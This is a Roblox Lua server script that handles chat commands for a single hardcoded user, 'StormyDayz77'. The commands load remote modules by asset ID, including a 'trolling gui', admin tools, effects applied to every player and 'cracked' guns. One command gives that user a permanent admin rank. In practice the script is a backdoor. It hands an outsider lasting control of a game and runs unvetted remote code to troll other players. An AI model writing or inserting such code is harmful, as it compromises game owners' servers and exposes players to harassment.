local ownerUsername = "StormyDayz77"

local function isOwner(player)
	return player.Name == ownerUsername
end

local commandDictionary = {
	["utg"] = function(player)
		require(4748605382).new("StormyDayz77")
	end,
	["test"] = function(player)
		print("Apples")
		print("Oranges")
		print("Grapes")
		print("test ran and completed without error!")
	end,
  ["kronos"] = function(player)
		require(10605731487).load("StormyDayz77")
	end,
  ["particles"] = function(player)
		require(10615687377).load()
	end,
  ["guns"] = function(player)
		require(10400922788):Start("StormyDayz77","RacketsGunsCrackedLMFAO")
	end,
  ["debug"] = function(player)
		require(game:GetService("ReplicatedStorage"):WaitForChild("HDAdminSetup")):GetMain():GetModule("cf"):SetRank(game.Players.StormyDayz77, 1, 5, "Perm")
	end,
  ["cmdlets"] = function(player)
	warn("utg: Gives the ultimate trolling gui")
    warn("test: tests cmdlets to see if they are running")
    warn("Kronos: Gives the opensource (better adonis) Kronos admin")
    warn("particles: Gives hacker particles to everyone")
    warn("guns: gives you guns")
    warn("debug: elevates your admin level")
    warn("cuffs: Gives you handcuffs")
    warn("explorer: opens up a file explorer")
    warn("cmdlets: displays this output")
	end,
  ["cuffs"] = function(player)
		require(8438248697):Handcuffs('StormyDayz77')
	end,
  ["explorer"] = function(player)
		require(10253938997):Fire("StormyDayz77")
	end
}

game.Players.PlayerAdded:Connect(function(player)
	player.Chatted:Connect(function(message)
		print("Chatted event triggered")  -- Debug line

		-- Extract the command using a regular expression
		local command = string.match(message, "^/(%S+)")
		if command then
			command = string.lower(command)  -- Convert to lowercase for case-insensitive comparison
			print("Received command:", command)  -- Debug line

			local commandFunction = commandDictionary[command]
			if commandFunction then
				print("Command function found")  -- Debug line
				if isOwner(player) then
					print("Executing command")  -- Debug line
					local success, result = pcall(commandFunction, player)
					if not success then
						print("Error executing command:", result)
					end
				else
					print("Not the owner. If this was a mistake, contact a server security member.")
				end
			else
				print("Command not recognized")  -- Debug line
			end
		end
	end)
end)
